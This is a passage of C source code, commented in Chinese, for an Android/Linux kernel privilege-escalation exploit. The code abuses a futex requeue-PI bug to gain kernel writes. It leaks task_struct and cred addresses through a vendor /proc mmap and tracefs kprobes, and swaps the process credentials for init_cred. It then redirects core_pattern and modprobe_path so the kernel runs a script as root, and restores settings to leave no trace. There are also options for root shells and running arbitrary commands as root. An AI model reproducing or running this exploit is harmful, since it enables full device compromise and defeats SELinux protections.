      (unsigned long long)sla_sh->task2, (unsigned long long)sla_sh->n_hit2,
      (unsigned long long)sla_sh->agree2, USEMAIN);
  if (USEMAIN && (!MTASK || !sla_sh->agree2)) {
    say("[SLA] x USEMAIN but main-task missing/disagree -> no blind punch\n"); return 0;
  }
  DIAG_Z1 = (uintptr_t)sla_sh->z1; DIAG_Z2 = (uintptr_t)sla_sh->z2;
  say("[SLA] ★★★ W 的 task_struct = %016llx (%llu 条记录一致) ⇒ cred 槽 +%lx / real_cred 槽 +%lx\n",
      (unsigned long long)sla_sh->task, (unsigned long long)sla_sh->n_hit,
      (unsigned long)TASK_CRED_OFF, (unsigned long)TASK_RCRD_OFF);
  IC_CNT = sla_sh->icn;
  IC_V2 = sla_sh->ic2;
  IC_N2 = sla_sh->ic2n;
  /* ★ 采信哪一个是 init_cred 的运行时地址? —— sen20 把两条路都量了一遍, 结论是**信算法**:
   *   · 同构建 kallsyms 逐字核对 `init_cred = ffffffc01293d528`(与 LK_INIT_CRED 一字不差);
   *   · SLIDE 由 435/435 的窄窗口正对照钉死;
   *   · 更硬的一条是 sen19 的**定量反证**: 写完后 W 自报 uid=-118=0xFFFFFF8A, 恰好等于
   *     `(TASK+0x840)>>32` —— 这正是形状(2) 第二笔 `*(right)=pc` 该产生的数, 说明
   *     **内核真的把 right 那份 init_cred 当成了我们的 cred 在用**(地址对、几何对、只是 uid 被弄脏)。
   *   而窗口里的"cred 众数"这一把落在 `_etext+0x1edb0`(**.rodata 里, 根本不是 cred**) ⇒ 1147 个
   *   候选里绝大多数是假阳性, 6 票的簇也只是同一处只读数据的重复 ⇒ 众数降级为**旁证/对照**,
   *   不再当权威。但把它打印出来仍然有用: 哪天真和算法值撞上同一格, 就是双重确认。 */
  ICRED = (uintptr_t)(LK_INIT_CRED + SLIDE);
  {
    uintptr_t mode = (uintptr_t)sla_sh->icred;
    say("[SLA] (B) 采信 **算法值** init_cred = %016lx (kallsyms@1293d528 + slide=%lx)\n"
        "      窗口众数 %016lx(票 %llu) 只作对照; 二者%s ⇒ %s\n",
        (unsigned long)ICRED, (unsigned long)SLIDE, (unsigned long)mode,
        (unsigned long long)sla_sh->icn,
        mode == ICRED ? "相同" : "不同",
        mode == ICRED ? "双重确认(众数也指向同一个对象)"
                      : "众数那条是假阳性(它落在 .rodata, 见 analysis §10) ⇒ 按算法值打");
  }
  sla_cached = 1;
  /* ★ USEMAIN/VICTIM 下调用方要的"我的 task"是**靶子**那一份; 主标记(W)那一份在 VICTIM 模式里
   *   只是顺带(早退条件只看靶子) ⇒ 这里若返回 sla_sh->task 就会把已经认出来的靶子丢掉。 */
  return USEMAIN ? MTASK : (uintptr_t)sla_sh->task;
}
/* 读回一个核地址的 qword(同样用一次性子进程; 只映射到目标页为止 ⇒ 便宜) */
static uint64_t sla_peek(uintptr_t va) {
  if (sla_shm_init() || !sla_sh->k || va <= sla_sh->k) return 1;
  size_t off = (size_t)(va - sla_sh->k);
  pid_t c;
  int st = 0;
  sla_spawn_child = 1;
  c = fork();
  if (c == 0) {
    int fd = open("/proc/sla/wlan_stats", O_RDONLY | O_CLOEXEC);
    if (fd < 0) _exit(1);
    size_t len = (off + 8 + 4095u) & ~(size_t)4095u;
    unsigned char *m = mmap(NULL, len, PROT_READ, MAP_SHARED, fd, 0);
    if (m != MAP_FAILED) {
      struct sigaction sa;
      memset(&sa, 0, sizeof sa); sa.sa_handler = sbb_handler; sigemptyset(&sa.sa_mask);
      sigaction(SIGBUS, &sa, NULL);
      sbb_on = 1;
      if (sigsetjmp(sbb_jb, 1) == 0) sla_sh->peek[0] = win64(m, off);
      sbb_on = 0;
      munmap(m, len);
    }
    close(fd);
    _exit(0);
  }
  sla_spawn_child = 0;
  if (c < 0) return 3;
  waitpid(c, &st, 0);
  if (st != 0) return 4;
  return sla_sh->peek[0];
}

/* 读另一个线程/进程的凭据: /proc/<tid>/status 的 Uid:/Gid: 四栏(内核取的是 real_cred),
 * 这正是"相4 写 real_cred 有没有落"的现成判据, 而且不需要任何权限。 */
static int task_ids(pid_t tid, int u[4], int g[4]) {
  char path[64], b[2048];
  snprintf(path, sizeof path, "/proc/%d/status", (int)tid);
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) return -1;
  ssize_t n = read(fd, b, sizeof b - 1);
  close(fd);
  if (n <= 0) return -2;
  b[n] = 0;
  for (int i = 0; i < 4; i++) { u[i] = -1; g[i] = -1; }
  char *p2 = strstr(b, "\nUid:"); if (!p2) p2 = strstr(b, "Uid:");
  if (!p2) return -3;
  p2 += 5;
  for (int i = 0; i < 4; i++) { while (*p2 == 32 || *p2 == 9) p2++; u[i] = (int)strtol(p2, &p2, 10); }
  p2 = strstr(b, "\nGid:"); if (!p2) p2 = strstr(b, "Gid:");
  if (!p2) return -4;
  p2 += 5;
  for (int i = 0; i < 4; i++) { while (*p2 == 32 || *p2 == 9) p2++; g[i] = (int)strtol(p2, &p2, 10); }
  return 0;
}

/* /proc/self/status 的 Uid:/Gid: 四栏 = real / effective / saved / filesystem。
 * 这一手是"动态地址上逐发自校验"的关键: 我们往自己的 cred 里写零, 而 uid 是不是真变成 0
 * **用户态一眼可见**(不需要任何额外权限), 所以每一发纯零写都有硬判据 ⇒ 不再有任何盲赌。 */
static int self_ids(int u[4], int g[4]) {
  char b[2048];

  int fd = open("/proc/self/status", O_RDONLY | O_CLOEXEC);
  if (fd < 0) return -1;
  ssize_t n = read(fd, b, sizeof b - 1);
  close(fd);
  if (n <= 0) return -2;
  b[n] = 0;
  for (int i = 0; i < 4; i++) { u[i] = -1; g[i] = -1; }
  char *p = strstr(b, "\nUid:"); if (!p) p = strstr(b, "Uid:");
  if (p) { p += 5; for (int i = 0; i < 4; i++) { while (*p == ' ' || *p == '\t') p++; u[i] = (int)strtol(p, &p, 10); } }
  else return -3;
  p = strstr(b, "\nGid:"); if (!p) p = strstr(b, "Gid:");
  if (p) { p += 5; for (int i = 0; i < 4; i++) { while (*p == ' ' || *p == '\t') p++; g[i] = (int)strtol(p, &p, 10); } }
  else return -4;
  return 0;
}

/* ============ permissive 之后的内核指针泄漏: tracefs kprobe 的 fetcharg ============
 * 为什么走这条路: rb_next 那条"读通道"要求指针链恰好在一步内终止(见
 * analysis/GHOST-READ-CHANNEL-20260927.md), 而 task_struct 的 +0x10 不是 0 ⇒ 无界下潜 ⇒ 已判废。
 * kprobe 的 fetcharg 是**寄存器 + 常量偏移**的有界读 ⇒ 一步到位:
 *   wake_up_process 只有一个参数 = 被唤醒的 task_struct* ⇒ %x0 就是活的 task 真身,
 *   +0x848(%x0) = task->cred, +0xb4/+0xb8 = prio/static_prio(**应当都是 120** ⇒ 偏移表现场正对照)。
 * DAC: kprobe_events 属于厂商挂的 readtracefs 组(0666), 之前连 stat 都被 SELinux 挡 ⇒
 *   所以这一手必须在 enforcing=0 之后做, 也正是"permissive 真的生效了"的行为级判据。
 * 触发: main 自己 nanosleep ⇒ hrtimer 到期后 hrtimer_wakeup→wake_up_process(main 的 task)
 *       ⇒ 探针必响, 不需要任何跨线程协调(而且都是 main 的 syscall, 不动 W 的载荷带)。 */
static int tf_write(const char *path, const char *txt) {
  int fd = open(path, O_WRONLY | O_CLOEXEC);
  if (fd < 0) { say("[TF] 开 %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return -1; }
  ssize_t n = write(fd, txt, strlen(txt));
  int e = errno;
  close(fd);
  if (n != (ssize_t)strlen(txt)) {
    say("[TF] 写 %s 失败 n=%zd errno=%d(%s) 内容=%s\n", path, n, e, strerror(e), txt);
    return -2;
  }
  return 0;
}
/* 从 ftrace 文本里取"字段名=值"(值可能是 0x 十六进制或十进制 ⇒ base 0); 取**最后一次**出现 */
static int getfield(const char *s, const char *name, unsigned long long *out) {
  char pat[32];
  snprintf(pat, sizeof pat, "%s=", name);
  const char *p = s, *last = NULL;
  size_t L = strlen(pat);
  while ((p = strstr(p, pat))) { last = p + L; p += L; }
  if (!last) return 0;
  char *e = NULL;
  unsigned long long v = strtoull(last, &e, 0);
  if (e == last) return 0;
  *out = v;
  return 1;
}
static uintptr_t LEAK_T = 0, LEAK_CRED = 0;
static long LEAK_PR = -1, LEAK_SP = -1;
/* 逐行扫 ftrace 文本: 只认"prio/static_prio 二元组 == 我们自己刚设的标记"的样本。
 * 为什么不能用 comm 筛: 这一行的 comm/pid 是**唤醒者所在上下文**的(hrtimer 到期时往往是
 * swapper/idle), 跟被唤醒的我们无关。⇒ 用 nice 标记 + "同一个 t 至少出现两次" 认定。 */
static int parse_trace(const char *buf) {
  const char *p = buf;
  int same = 0, seen = 0;
  uintptr_t last = 0;
  while (*p) {
    const char *nl = strchr(p, '\n');
    size_t L = nl ? (size_t)(nl - p) : strlen(p);
    char line[256];
    if (L >= sizeof line) L = sizeof line - 1;
    memcpy(line, p, L); line[L] = 0;
    unsigned long long t = 0, c = 0, pr = 0, sp = 0;
    if (getfield(line, " t", &t) && getfield(line, " c", &c) &&
        getfield(line, "pr", &pr) && getfield(line, "sp", &sp)) {
      seen++;
      if ((long)pr == LEAK_PRIO && (long)sp == LEAK_PRIO) {
        if ((uintptr_t)t == last) same++;
        else { last = (uintptr_t)t; same = 1; }
        LEAK_T = (uintptr_t)t; LEAK_CRED = (uintptr_t)c;
        LEAK_PR = (long)pr; LEAK_SP = (long)sp;
      }
    }
    if (!nl) break;
    p = nl + 1;
  }
  say("[TF] 缓冲区里共 %d 条 gscan 样本, 命中 prio 标记且重复 ≥2 的最后一条 t=%016lx (同值 %d 次)\n",
      seen, (unsigned long)last, same);
  if (same >= 2) return 1;
  return 0;
}
/* 探针文本的**候选阶梯**: 本机没在"MAC 放行"状态下试过 kprobe_events ⇒ 一次只试一种形式,
 * 把"权限被拒(EACCES=MAC 还拦)"与"参数非法(EINVAL=语法不被接受)"彻底分开。
 * 一级偏移 = 寄存器+常量; 二级偏移 = 寄存器 → 指针 → 常量(正是我们想要的 task->cred)。 */
static const char *KP_TXT[4] = {
  /* #0 十进制偏移 + 全字段(0x848=2120, 0xb4=180, 0xb8=184) —— 首选 */
  "p gscan wake_up_process t=%x0:u64 c=+2120(%x0):u64 pr=+180(%x0):u32 sp=+184(%x0):u32",
  /* #1 十六进制偏移 + 全字段(旧写法) */
  "p gscan wake_up_process t=%x0:u64 c=+0x848(%x0):u64 pr=+0xb4(%x0):u32 sp=+0xb8(%x0):u32",
  /* #2 最小形式: 只证明"这个函数能挂探针"(不带 cred) */
  "p gscan wake_up_process t=%x0:u64",
  /* #3 二级解引用(task → cred → 那一格的头 8 字节) */
  "p gscan wake_up_process t=%x0:u64 c=+0x0(+0x848(%x0)):u64",
};
static int KP_TRY = 2;         /* 试前 KP_TRY 种(都是带 cred 的全字段形式); 0 = 只试 #1(旧行为) */

static int tracefs_leak(void) {
  const char *bases[2] = { "/sys/kernel/tracing", "/sys/kernel/debug/tracing" };
  const char *base = NULL;
  char path[256];
  static char buf[256 * 1024];       /* 8 个 CPU × 16 KB 的快照要一次读回来(放静态, 别压栈) */
  int oldnice = getpriority(PRIO_PROCESS, 0);
  setpriority(PRIO_PROCESS, 0, LEAK_NICE);               /* 给自己盖上 (137,137) 的戳 */
  for (int i = 0; i < 2; i++) {
    snprintf(path, sizeof path, "%s/kprobe_events", bases[i]);
    int fd = open(path, O_WRONLY | O_APPEND | O_CLOEXEC);
    if (fd >= 0) { close(fd); base = bases[i]; break; }
    say("[TF] %s -> errno=%d(%s)\n", path, errno, strerror(errno));
  }
  if (!base) { setpriority(PRIO_PROCESS, 0, oldnice); return -1; }
  snprintf(path, sizeof path, "%s/kprobe_events", base);
  int firstfd = open(path, O_WRONLY | O_CLOEXEC);
  if (firstfd < 0) { say("[TF] 开不到 %s errno=%d\n", path, errno); setpriority(PRIO_PROCESS, 0, oldnice); return -1; }
  close(firstfd);
  int accepted = -1;
  {
    int ntry = KP_TRY ? KP_TRY : 3;
    for (int ti = 0; ti < ntry && ti < 4; ti++) {
      int fd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);   /* 先清空(残留同名事件会 EINVAL) */
      if (fd >= 0) close(fd);
      if (tf_write(path, KP_TXT[ti])) { say("[TF] 形式#%d 被拒 ⇒ 换下一种\n", ti); continue; }
      accepted = ti;
      say("[TF] ★ 形式#%d 被内核接受: %s\n", ti, KP_TXT[ti]);
      break;
    }
  }
  if (accepted < 0) { setpriority(PRIO_PROCESS, 0, oldnice); return -2; }
  snprintf(path, sizeof path, "%s/events/kprobes/gscan/enable", base);
  if (tf_write(path, "1")) { setpriority(PRIO_PROCESS, 0, oldnice); return -3; }
  for (int i = 0; i < 6; i++) {
    struct timespec ts = { 0, 60 * 1000 * 1000 };
    nanosleep(&ts, NULL);            /* 每次都让 hrtimer 到期去 wake_up_process(我) */
  }
  int got = 0;
  const char *files[2] = { "trace", "trace_pipe" };
  snprintf(path, sizeof path, "%s/buffer_size_kb", base);   /* 0666: 把每 CPU 环形缓冲限定到 16 KB */
  tf_write(path, "16");                                     /* ⇒ 快照能整块读回来(否则几十 MB) */
  for (int i = 0; i < 2 && !got; i++) {
    snprintf(path, sizeof path, "%s/%s", base, files[i]);
    int rfd = open(path, O_RDONLY | O_NONBLOCK | O_CLOEXEC);
    if (rfd < 0) { say("[TF] 开 %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); continue; }
    ssize_t n = 0, tot = 0;
    while ((size_t)tot + 1 < sizeof buf && (n = read(rfd, buf + tot, sizeof buf - 1 - tot)) > 0)
      tot += n;
    buf[tot] = 0;
    close(rfd);
    if (tot <= 0) { say("[TF] %s 没读到东西 n=%zd errno=%d\n", files[i], n, errno); continue; }
    say("[TF] %s 读回 %zd 字节\n", files[i], tot);
    got = parse_trace(buf);
    if (!got) {
      const char *q = strstr(buf, "gscan");
      say("[TF] %s 里没有命中 prio 标记的样本; 片段=%s\n", files[i], q ? q : "(没有 gscan 字样)");
    }
  }
  snprintf(path, sizeof path, "%s/events/kprobes/gscan/enable", base);
  tf_write(path, "0");
  snprintf(path, sizeof path, "%s/kprobe_events", base);
  int cfd = open(path, O_WRONLY | O_TRUNC | O_CLOEXEC);      /* 收尾: 把探针摘掉(不留任何痕迹) */
  if (cfd >= 0) close(cfd);
  if (!got) { setpriority(PRIO_PROCESS, 0, oldnice); return -4; }
  say("[TF] 采纳样本: t=%016lx cred=%016lx prio=%ld static_prio=%ld\n",
      (unsigned long)LEAK_T, (unsigned long)LEAK_CRED, LEAK_PR, LEAK_SP);
  setpriority(PRIO_PROCESS, 0, oldnice);                 /* 立刻把 nice 还原(别拖慢 hammer) */
  if ((LEAK_T & 7) || (LEAK_CRED & 7) ||
      (LEAK_T >> 48) != 0xffffULL || (LEAK_CRED >> 48) != 0xffffULL) {
    say("[TF] × t/cred 不像内核指针 ⇒ 不采纳\n");
    return -5;
  }
  return 0;                     /* prio 二元组已在 parse_trace 里当作筛选条件(+重复≥2 次) */
}

/* 行为级判据: 这三条在 LSM 关卡还在时**必然**被拒(DAC/SELinux 各挡一道),
 * 相1+相2 之后应当全部 open 成功 ⇒ 比"读一个字节"更硬的正对照。 */
static void filegate_probe(const char *tag) {
  static const char *paths[3] = { "/proc/kcore", "/sys/kernel/tracing/kprobe_events",
                                  "/proc/1/environ" };
  static const int flags[3] = { O_RDONLY, O_RDWR, O_RDONLY };
  for (int i = 0; i < 3; i++) {
    int fd = open(paths[i], flags[i]);
    int e = errno;
    say("[GATE:%s] open(%s,%s) = %d errno=%d(%s)\n", tag, paths[i],
        flags[i] == O_RDWR ? "RDWR" : "RDONLY", fd, fd < 0 ? e : 0, fd < 0 ? strerror(e) : "OK");
    if (fd >= 0) close(fd);
  }
}

/* 控制相的观察通道: /proc/loadavg 的第一列就是 avenrun[0](经 -32 再 >>FSHIFT 的线性变换),
 * 所以只要"avenrun[0] ← 某个核指针"真的生效, 这里就会读到**几十亿**这种离谱值;
 * 读它零副作用(shell 本来就能读), 也不依赖 SELinux ⇒ 拿来判".bss 写到底落没落"最干净。 */
static double read_load0(void) {
  char b[160];
  int fd = open("/proc/loadavg", O_RDONLY | O_CLOEXEC);
  if (fd < 0) { say("[LA] 开 /proc/loadavg 失败 errno=%d(%s)\n", errno, strerror(errno)); return -1; }
  ssize_t n = read(fd, b, sizeof b - 1);
  close(fd);
  if (n <= 0) return -1;
  b[n] = 0;
  b[strcspn(b, "\n")] = 0;
  char *e = NULL;
  double v = strtod(b, &e);
  say("[LA] /proc/loadavg = [%s] 第一列=%f\n", b, v);
  return e == b ? -2.0 : v;
}

/* ============ 临时 root 的收口: 让内核自己以 uid 0 执行我们的脚本 ============
 * 相1..3 把 inode_permission / file_open / bprm_set_creds 三条钩子链清空之后:
 *   · 写 /proc/sys/kernel/{core_pattern,modprobe_path} 不再被 DAC/MAC 挡(它们本来 0644 root)
 *   · exec 一个"内核不认识的文件"不再被 SELinux 的域转换检查挡(那条检查就在 bprm_set_creds 里)
 * 于是两个经典触发都能让 **call_usermodehelper 以 uid 0/全 caps/(继承的)kernel 域** 跑我们的脚本:
 *   触发A: modprobe_path 指向脚本 + execve 一个未知 magic 的文件 ⇒ request_module("binfmt-%04x")
 *   触发B: core_pattern 指向脚本 + 让一个子进程 SIGSEGV(需 RLIMIT_CORE>0)
 * 全程不落地: 用完把两个 sysctl 复原、脚本删掉(临时 root, 不留持久化) ✔ */
#define EH_PATH "/data/local/tmp/ghost_eh"
#define EH_TRIG "/data/local/tmp/ghost_trig"
#define EH_LOG  "/data/local/tmp/ghost_root.log"
static int put_file(const char *path, const char *buf, size_t n, int mode) {
  int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, mode);
  if (fd < 0) { say("[EH] 建 %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return -1; }
  ssize_t w = write(fd, buf, n);
  int e = errno;
  close(fd);
  if (w != (ssize_t)n) { say("[EH] 写 %s 失败 n=%zd errno=%d(%s)\n", path, w, e, strerror(e)); return -2; }
  if (mode >= 0) chmod(path, 0755);
  return 0;
}
static int sysctl_read(const char *path, char *out, size_t n) {
  int fd = open(path, O_RDONLY | O_CLOEXEC);
  if (fd < 0) { say("[EH] 读 %s 失败 errno=%d(%s)\n", path, errno, strerror(errno)); return -1; }
  ssize_t r = read(fd, out, n - 1);
  close(fd);
  if (r <= 0) { out[0] = 0; return -2; }
  out[r] = 0;
  while (r > 0 && (out[r - 1] == '\n' || out[r - 1] == ' ')) out[--r] = 0;
  return 0;
}
/* 主流程: 布置 helper + 两个触发, 读回 root 证据, 最后复原(不留持久化) */
static int try_root_triggers(void) {
  char old_core[256] = "", old_mod[256] = "", pipe[256];
  sysctl_read("/proc/sys/kernel/core_pattern", old_core, sizeof old_core);
  sysctl_read("/proc/sys/kernel/modprobe", old_mod, sizeof old_mod);
  say("[EH] 原 core_pattern=[%s] modprobe=[%s]\n", old_core, old_mod);
  static const char *script =
      "#!/system/bin/sh\n"
      "{\n"
      "echo \"=== helper argv1=$1 ===\"\n"
      "id\n"
      "getenforce\n"
      "grep -E '^(Name|Uid|Gid|CapEff|CapBnd|Seccomp|NoNewPrivs)' /proc/self/status\n"
      "} >> " EH_LOG " 2>&1\n";
  if (put_file(EH_PATH, script, strlen(script), 0755)) return -1;
  /* 未知 binfmt magic(0xffff414f 不属于任何已注册格式) ⇒ search_binary_handler 走 request_module */
  static const char trig[8] = { (char)0xff, (char)0xff, 0x41, 0x4f, 0, 0, 0, 0 };
  if (put_file(EH_TRIG, trig, sizeof trig, 0755)) return -1;
  unlink(EH_LOG);
  snprintf(pipe, sizeof pipe, "|%s\n", EH_PATH);
  if (put_file("/proc/sys/kernel/core_pattern", pipe, strlen(pipe), -1)) return -3;
  if (put_file("/proc/sys/kernel/modprobe", EH_PATH "\n", strlen(EH_PATH) + 1, -1)) return -4;
  say("[EH] 已把 core_pattern 指到管道 helper、modprobe_path 指到脚本 ⇒ 开火\n");
  pid_t p1 = fork();
  if (p1 == 0) {
    char *av[] = { EH_TRIG, NULL };
    execv(EH_TRIG, av);
    _exit(127);
  }
  if (p1 > 0) { int st = 0; waitpid(p1, &st, 0); say("[EH] 触发A exec 子进程 rc=%d(status=%d, 期望 ENOEXEC)\n", st, st); }
  else say("[-] fork A 失败 errno=%d\n", errno);
  pid_t p2 = fork();
  if (p2 == 0) {
    struct rlimit rl;
    rl.rlim_cur = RLIM_INFINITY; rl.rlim_max = RLIM_INFINITY;
    setrlimit(RLIMIT_CORE, &rl);
    signal(SIGSEGV, SIG_DFL);
    raise(SIGSEGV);
    _exit(1);
  }
  if (p2 > 0) { int st = 0; waitpid(p2, &st, 0); say("[EH] 触发B 子进程 status=%d(段错误=139 才算真崩了)\n", st); }
  usleep(2500000);
  char lb[4096];
  int rc = sysctl_read(EH_LOG, lb, sizeof lb);
  say("[EH] %s 读回 rc=%d =====\n%s\n==================\n", EH_LOG, rc, rc == 0 ? lb : "(还没有内容 ⇒ helper 没跑起来)");
  /* 复原(不留持久化): **优先复原成我们读到的原值**, 读不到才退回内核默认 */
  char old[256];
  if (sysctl_read("/proc/sys/kernel/core_pattern", old, sizeof old) == 0 && old[0] == '|') {
    const char *cv = old_core[0] ? old_core : "core";
    put_file("/proc/sys/kernel/core_pattern", cv, strlen(cv) + 1, -1);
    const char *mv = old_mod[0] ? old_mod : "/sbin/modprobe";
    put_file("/proc/sys/kernel/modprobe", mv, strlen(mv) + 1, -1);
    say("[EH] 已把 core_pattern 复原成 [%s] / modprobe_path 复原成 [%s]\n", cv, mv);
  }
  unlink(EH_PATH); unlink(EH_TRIG);
  return 0;
}

/* ============ 回合制: 一幽灵 = 一笔有效写 ============ */
static void make_ghost(void) {
  for (int i = 0; i < 30; i++) {
    errno = 0;
    long r = fx(N, FCMP, 1, (struct timespec *)1, PI, 0);
    int e = errno;
    if (r == -1 && e == EDEADLK) return;          /* 回滚走 remove_waiter ⇒ 留下幽灵 */
    if (i % 5 == 0) say("[g] #%d requeue ret=%ld errno=%d(%s)\n", i, r, e, strerror(e));
    usleep(100000);
  }
  say("× 造幽灵失败(30 次没拿到 EDEADLK)\n");
  stop_all = 1;
}

/* ★ 真机结论(9/27 最晚): **幽灵不会被消耗** —— 相1 那笔写就是同一颗幽灵上的第 2 发落地的。
   ⇒ 推进相只要"换载荷 + 换一块干净的假 lock":
       相0 lock=uts hole1 ; 相1 lock=带内 S+0x60(每轮被我们自己重铺清零) ;
       相2 lock=uts hole2(相1 已把它的 rb_leftmost 预置成 S ⇒ 命中内核 `*leftmost==node` 分支,
           于是 rb_next() 的返回值被写回 hole2+0x10 ⇒ uname 读回真 task 地址);
       相3/4 lock=带内。
   ⇒ 不再重造幽灵(重造时 requeue 直接**成功**而不是 EDEADLK, 每相白等 3s 还拿不到幽灵)。 */
static int next_round(int *phase, int *rounds) {   /* 0 = 别再打了 */
  *phase += 1; *rounds = 0;
  __atomic_store_n(&h_phase, *phase, __ATOMIC_RELEASE);
  if (*phase > MAX_ROUNDS) { say("× 到相上限(%d) ⇒ 收工\n", MAX_ROUNDS); return 0; }
  say("[R] === 相 %d 开始(同一颗幽灵, 换载荷/换 lock) ===\n", *phase);
  return !stop_all;
}

int main(int argc, char **argv) {
  if (argc < 2) { fprintf(stderr, "用法: m1 <slide_hex>\n"); return 2; }
  SLIDE = strtoull(argv[1], NULL, 16);
  pin_to(MCPU);
  /* 用法: pr <slide> [probe [lo_word count [matchprio]]] [benign] */
  for (int i = 2; i < argc; i++) {
    if (!strcmp(argv[i], "probe")) {
      FILL_PROBE = 1;
      if (i + 1 < argc) PROBE_LO = (int)strtol(argv[i + 1], NULL, 0);
      if (i + 2 < argc) PROBE_N = (int)strtol(argv[i + 2], NULL, 0);
      if (i + 3 < argc) { PROBE_MATCH = (uint64_t)strtoull(argv[i + 3], NULL, 0); PROBE_MATCH_SET = 1; }
      if (i + 4 < argc) { PROBE_POISON = (uint64_t)strtoull(argv[i + 4], NULL, 0); PROBE_MATCH_SET = 1; }
    } else if (!strcmp(argv[i], "shape1")) {
      SHAPE = 1;
    } else if (!strcmp(argv[i], "shape2")) {
      SHAPE = 2;
    } else if (!strcmp(argv[i], "hijack")) {
      HIJACK = 1;
    } else if (!strcmp(argv[i], "victim")) {
      SENOFF = 1; HIJACK = 1; VICTIM = 1; USEMAIN = 1;
    } else if (!strcmp(argv[i], "mtarget")) {
      USEMAIN = 1;
    } else if (!strcmp(argv[i], "diag")) {
      SENOFF = 1; DIAG = 1;
    } else if (!strcmp(argv[i], "twin")) {
      SENOFF = 1; HIJACK = 1; TWIN = 1;
    } else if (!strcmp(argv[i], "sen")) {
      SENOFF = 1; HIJACK = 1;
    } else if (!strncmp(argv[i], "ph2=", 4)) {
      PH2 = (int)strtol(argv[i] + 4, NULL, 0);
    } else if (!strcmp(argv[i], "markdiff")) {
      MARKD = 1;
    } else if (!strcmp(argv[i], "senresume")) {
      SENOFF = 1; HIJACK = 1; SENREST = 1;
    } else if (!strcmp(argv[i], "senredo")) {
      SENOFF = 1; HIJACK = 1; SENREST = 2;
    } else if (!strcmp(argv[i], "kids")) {
      KIDS = 1;
    } else if (!strcmp(argv[i], "shell")) {
      SHELLMODE = 1;
    } else if (!strncmp(argv[i], "post=", 5)) {
      SHELLMODE = 1;                       /* post 靠 shell 孩子以 root 执行 ⇒ 顺带打开它 */
      POSTSH = argv[i] + 5;
    } else if (!strcmp(argv[i], "ishell")) {
      SHELLMODE = 1; ISHELLMODE = 1;
    } else if (!strcmp(argv[i], "xroot")) {
      XROOT = 1;
    } else if (!strncmp(argv[i], "shots=", 6)) {
      KID_SHOTS = (int)strtol(argv[i] + 6, NULL, 0);
      if (KID_SHOTS > MAXKID) KID_SHOTS = MAXKID;
    } else if (!strncmp(argv[i], "wcpu=", 5)) {
      WCPU = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "mcpu=", 5)) {
      MCPU = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strcmp(argv[i], "peek")) {
      PEEK = 1;
    } else if (!strncmp(argv[i], "maxr=", 5)) {
      MAX_ROUNDS = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "lk2=", 4)) {
      LK2_OFF2 = (long)strtol(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "rdph=", 5)) {
      RDPH = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "x=", 2)) {
      XABS = (long)strtoull(argv[i] + 2, NULL, 0);
    } else if (!strncmp(argv[i], "tgt=", 4)) {
      TGT_ABS = (long)strtoull(argv[i] + 4, NULL, 0);
    } else if (!strcmp(argv[i], "direct")) {
      DIRECT = 1;
    } else if (!strncmp(argv[i], "lk=", 3)) {
      LK_OFF = (int)strtol(argv[i] + 3, NULL, 0);
    } else if (!strncmp(argv[i], "tg=", 3)) {
      TG_OFF = (int)strtol(argv[i] + 3, NULL, 0);
    } else if (!strncmp(argv[i], "dst=", 4)) {
      DST = (uintptr_t)strtoull(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "val=", 4)) {
      const char *v = argv[i] + 4;
      if (v[0] == 'S' && (v[1] == '+' || v[1] == '-')) {
        VAL_ABS = -1; VAL_REL = (long)strtoll(v + 1, NULL, 0);
      } else { VAL_ABS = (long)strtoull(v, NULL, 0); }
    } else if (!strncmp(argv[i], "probe=", 6)) {
      PROBE_TXT = argv[i] + 6; PROBE_PATH = PROBE_TXT;
    } else if (!strncmp(argv[i], "expect=", 7)) {
      EXPECT = (uintptr_t)strtoull(argv[i] + 7, NULL, 0);
    } else if (!strcmp(argv[i], "avtest")) {
      AVTEST = 1; PROBE_PATH = "/proc/loadavg";
    } else if (!strcmp(argv[i], "c1uts")) {
      C1UTS = 1;
    } else if (!strncmp(argv[i], "nph=", 4)) {
      NPH = (int)strtol(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "sp=", 3)) {
      SCANY = 1;
      SP_REL = (long)strtoll(argv[i] + 3, NULL, 0);
    } else if (!strncmp(argv[i], "task=", 5)) {
      TASK = (uintptr_t)strtoull(argv[i] + 5, NULL, 0);
    } else if (!strncmp(argv[i], "rounds=", 7)) {
      ROUNDS_MAX = (int)strtol(argv[i] + 7, NULL, 0);
    } else if (!strcmp(argv[i], "ctl")) {
      CTL = 1;
    } else if (!strncmp(argv[i], "ctl=", 4)) {
      CTL = 1; CTL_ADDR = (uintptr_t)strtoull(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "fops", 4)) {
      FOPS_WORD = (int)strtol(argv[i] + 4, NULL, 0);
    } else if (!strcmp(argv[i], "nospray")) {
      NO_SPRAY = 1;
    } else if (!strcmp(argv[i], "hammer")) {
      HAMMER = 1;
    } else if (!strncmp(argv[i], "hmax", 4)) {
      H_MAX = strtol(argv[i] + 4, NULL, 0);
    } else if (!strncmp(argv[i], "ncopy", 5)) {
      NCOPY = (int)strtol(argv[i] + 5, NULL, 0);
    } else if (argv[i][0] == 'w' && argv[i][1] >= '0' && argv[i][1] <= '9') {
      WAITER_WORD = (int)strtol(argv[i] + 1, NULL, 0);
    } else if (!strcmp(argv[i], "benign")) {
      WP_PRIO = 120;   /* 5.4 的 task_to_waiter 用真 prio ⇒ 相等即出 */
    }
  }
  if (DIRECT) { h_want = 1; h_phase = 1; }   /* 跳过泄漏相: 第一发就是目标写 */
  FAKE_LOCK = LK_INIT_UTS + LK_OFF + SLIDE;   /* rb_node 落在 lock+0x08, leftmost 落在 lock+0x10 */
  FAKE_TGT  = LK_INIT_UTS + TG_OFF + SLIDE;
  init_futex_words();
  FRM = mmap(0, 0x8000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
